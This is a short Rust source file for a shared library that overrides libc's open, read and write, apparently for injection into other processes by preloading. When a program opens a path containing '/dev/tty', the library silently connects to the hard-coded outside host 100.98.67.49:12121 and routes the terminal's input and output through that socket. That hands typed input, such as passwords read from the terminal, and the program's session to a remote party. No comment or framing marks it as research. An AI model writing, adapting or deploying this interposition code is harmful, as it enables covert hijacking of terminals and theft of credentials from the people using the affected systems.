extern crate lazy_static;
extern crate libc;

use lazy_static::lazy_static;
use libc::{c_char, c_int, c_void, size_t, ssize_t};
use std::io::{Read, Write};
use std::{ffi::CStr, net::TcpStream, os::fd::AsRawFd, sync::Mutex};

lazy_static! {
    static ref CLIENT_SOCKET: Mutex<Option<TcpStream>> = Mutex::new(None);
}

#[no_mangle]
pub extern "C" fn open(pathname: *const c_char, flags: c_int) -> c_int {
    let path = unsafe { CStr::from_ptr(pathname).to_str().unwrap() };
    if path.contains("/dev/tty") {
        let mut client_socket = CLIENT_SOCKET.lock().unwrap();
        if client_socket.is_none() {
            let stream = TcpStream::connect("100.98.67.49:12121").expect("Connection failed");
            *client_socket = Some(stream);
        }
        client_socket.as_ref().unwrap().as_raw_fd()
    } else {
        unsafe { libc::open(pathname, flags) }
    }
}

#[no_mangle]
pub extern "C" fn read(fd: c_int, buf: *mut c_void, count: size_t) -> ssize_t {
    let mut client_socket = CLIENT_SOCKET.lock().unwrap();
    if let Some(ref mut stream) = *client_socket {
        if fd == stream.as_raw_fd() {
            let mut buffer = vec![0u8; count];
            let read = stream.read(&mut buffer);
            match read {
                Ok(bytes_read) => {
                    unsafe {
                        std::ptr::copy_nonoverlapping(buffer.as_ptr(), buf as *mut u8, bytes_read);
                    }
                    bytes_read as ssize_t
                }
                Err(_) => -1,
            }
        } else {
            unsafe { libc::read(fd, buf, count) }
        }
    } else {
        unsafe { libc::read(fd, buf, count) }
    }
}

#[no_mangle]
pub extern "C" fn write(fd: c_int, buf: *const c_void, count: size_t) -> ssize_t {
    let mut client_socket = CLIENT_SOCKET.lock().unwrap();
    if let Some(ref mut stream) = *client_socket {
        if fd == stream.as_raw_fd() {
            let buffer = unsafe { std::slice::from_raw_parts(buf as *const u8, count) };
            match stream.write(buffer) {
                Ok(written_bytes) => written_bytes as ssize_t,
                Err(_) => -1,
            }
        } else {
            unsafe { libc::write(fd, buf, count) }
        }
    } else {
        unsafe { libc::write(fd, buf, count) }
    }
}
